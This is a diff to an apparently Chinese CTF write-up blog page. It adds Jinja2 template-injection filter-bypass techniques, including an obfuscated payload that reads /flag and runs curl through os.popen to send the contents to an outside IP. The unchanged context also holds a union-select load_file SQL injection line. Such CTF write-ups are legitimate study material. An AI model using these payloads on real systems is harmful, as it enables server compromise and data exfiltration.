@@ -841,6 +841,35 @@ Returns a list of unique items from the given iterable.</code></pre>
 <pre><code>(()|select|string|list).__getitem__(24)~
 (()|select|string|list).pop(24)~
 (()|select|string|list)|attr(&#39;__getitem__&#39;)(15)~</code></pre>
+<p>length，count</p>
+<p>获取数字</p>
+<pre><code>&#123;%set pp=dict(po=a,p=a)|join|length%&#125; = 3
+&#123;%set pp=dict(p=a)|join|length%&#125; = 1
+&#123;%set pp=dict(p=a)|join|count%&#125; = 1</code></pre>
+<p><strong>print被ban 可以用反弹shell，贴个别人的脚本</strong></p>
+<pre><code>?name=
+&#123;% set c=dict(c=z)|join|length %&#125;
+&#123;% set cc=dict(cc=z)|join|length %&#125;
+&#123;% set ccc=dict(ccc=z)|join|length %&#125;
+&#123;% set cccc=dict(cccc=z)|join|length %&#125;
+&#123;% set ccccc=dict(ccccc=z)|join|length %&#125;
+&#123;% set cccccc=dict(cccccc=z)|join|length %&#125;
+&#123;% set ccccccc=dict(ccccccc=z)|join|length %&#125;
+&#123;% set cccccccc=dict(cccccccc=z)|join|length %&#125;
+&#123;% set ccccccccc=dict(ccccccccc=z)|join|length %&#125;
+&#123;% set cccccccccc=dict(cccccccccc=z)|join|length %&#125;
+&#123;% set space=(()|select|string|list).pop(ccccc*cc) %&#125;
+&#123;% set xhx=(()|select|string|list).pop(ccc*cccccccc) %&#125;
+&#123;% set point=(config|string|list).pop(cccccccccc*cc*cccccccccc-ccccccccc) %&#125;
+&#123;% set maohao=(config|string|list).pop(cc*ccccccc) %&#125;
+&#123;% set xiegang=(config|string|list).pop(-cccccccc*cccccccc) %&#125;
+&#123;% set globals=(xhx,xhx,dict(globals=z)|join,xhx,xhx)|join %&#125;
+&#123;% set builtins=(xhx,xhx,dict(builtins=z)|join,xhx,xhx)|join %&#125;
+&#123;% set open=(lipsum|attr(globals)).get(builtins).open %&#125;
+&#123;% set result=open((xiegang,dict(flag=z)|join)|join).read() %&#125;
+&#123;% set curlcmd=(dict(curl=z)|join,space,dict(http=z)|join,maohao,xiegang,xiegang,c,c,cccccccc,point,ccc,c,point,c,cccccc,cccccccc,point,c,ccccccccc,cccccccc,maohao,ccc,ccccccccc,c,c,c,xiegang,result)|join %&#125; 
+&#123;% set ohs=dict(o=z,s=z)|join %&#125;
+&#123;% set shell=(lipsum|attr(globals)).get(ohs).popen(curlcmd) %&#125;</code></pre>
 <h3 id="bsetDB"><a href="#bsetDB" class="headerlink" title="bsetDB"></a>bsetDB</h3><p>这题没做过，服务器直接崩掉。看了别人的wp，难度容易。</p>
 <p>考点：联合查询+load_file文件读取</p>
 <p>注释中给了sql查询句子。</p>
@@ -1088,18 +1117,17 @@ l&quot;/**/union/**/select/**/(select/**/load_file(0x2f666c6167)),2,3#</code></p
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/03/29/dasctf%E9%83%A8%E5%88%86wp/">
+                <a href="/2021/04/04/%E7%BA%A2%E6%98%8E%E8%B0%B7%E9%83%A8%E5%88%86wp/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="dasctf部分wp">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="红明谷部分wp">
                         
-                        <span class="card-title">dasctf部分wp</span>
+                        <span class="card-title">红明谷部分wp</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1109,9 +1137,9 @@ l&quot;/**/union/**/select/**/(select/**/load_file(0x2f666c6167)),2,3#</code></p
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-29
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-04-04
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1120,7 +1148,6 @@ l&quot;/**/union/**/select/**/(select/**/load_file(0x2f666c6167)),2,3#</code></p
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
